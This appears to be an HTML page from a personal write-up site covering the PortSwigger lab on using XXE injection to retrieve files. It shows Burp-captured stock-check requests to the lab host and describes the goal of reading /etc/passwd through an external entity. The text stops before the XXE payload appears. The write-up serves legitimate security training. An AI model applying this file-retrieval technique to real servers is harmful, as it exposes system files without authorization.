@@ -1,0 +1,2032 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My PortSwigger Web Security Academy writeups">
+      
+      
+        <meta name="author" content="Thanh Dat Hoang">
+      
+      
+        <link rel="canonical" href="https://hoangdat2407.github.io/myblog/Portswigger/XML%20external%20entity%20%28XXE%29%20injection/">
+      
+      
+        <link rel="prev" href="../Web%20socket/">
+      
+      
+        <link rel="next" href="../Clickjacking/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>XXE Injection - PortSwigger Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#xml-external-entity-xxe-injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="PortSwigger Writeups" class="md-header__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PortSwigger Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              XXE Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="PortSwigger Writeups" class="md-nav__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    PortSwigger Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Server-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Access%20control%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Authentication%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Business%20logic%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20upload%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GraphQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Information%20disclosure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Disclosure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20deserialize/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insecure Deserialization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JWT%20attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JWT Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoSQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Oauth/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OAuth
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20command%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Path%20traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prototype%20polution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prototype Pollution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20condition/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Race Condition
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20side%20template%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20cache%20poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Cache Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20socket/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WebSocket
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Client-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Clickjacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clickjacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CORS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DOM-based%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-based Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="xml-external-entity-xxe-injection">XML external entity (XXE) injection<a class="headerlink" href="#xml-external-entity-xxe-injection" title="Permanent link">&para;</a></h1>
+<h1 id="lab-exploiting-xxe-using-external-entities-to-retrieve-files"><strong>Lab: Exploiting XXE using external entities to retrieve files</strong><a class="headerlink" href="#lab-exploiting-xxe-using-external-entities-to-retrieve-files" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files">Lab: Exploiting XXE using external entities to retrieve files | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện chọn một sản phẩm. Điều hướng đến chức năng <code>Check stock</code></p>
+<p><img alt="image.png" src="image.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /product/stock</code> .</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a9c00e203ff709f80153570000800f7</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">nyvNNctbLdF5J5jqTcz9KTjlOYZkL0KE</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a9c00e203ff709f80153570000800f7.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">110</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a9c00e203ff709f80153570000800f7.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="nx">aaaa</span><span class="p">&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện thay đổi param <code>productId</code> thành <code>aaaa</code> . Quan sát response trả về là thông báo lỗi kèm theo cụm <code>aaaa</code> ⇒ có thể thông báo lỗi sẽ chứa giá trị của <code>productId</code></p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a9c00e203ff709f80153570000800f7</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">nyvNNctbLdF5J5jqTcz9KTjlOYZkL0KE</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a9c00e203ff709f80153570000800f7.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">110</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a9c00e203ff709f80153570000800f7.web-security-academy.net</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nx">empty</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">cors</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="o">&lt;?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="o">?&gt;</span><span class="p">&lt;</span><span class="nt">stockCheck</span><span class="p">&gt;&lt;</span><span class="nt">productId</span><span class="p">&gt;</span><span class="nx">aaaa</span><span class="p">&lt;/</span><span class="nt">productId</span><span class="p">&gt;&lt;</span><span class="nt">storeId</span><span class="p">&gt;</span><span class="mf">1</span><span class="p">&lt;/</span><span class="nt">storeId</span><span class="p">&gt;&lt;/</span><span class="nt">stockCheck</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%201.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện đổi giá trị của <code>stockId</code> thành việc gọi file <code>/etc/passwd</code> ⇒ có thể response lỗi sẽ render nội dung file:</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">product</span><span class="o">/</span><span class="nx">stock</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a9c00e203ff709f80153570000800f7</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">nyvNNctbLdF5J5jqTcz9KTjlOYZkL0KE</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a9c00e203ff709f80153570000800f7.web-security-academy.net/product?productId=1</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">172</span>
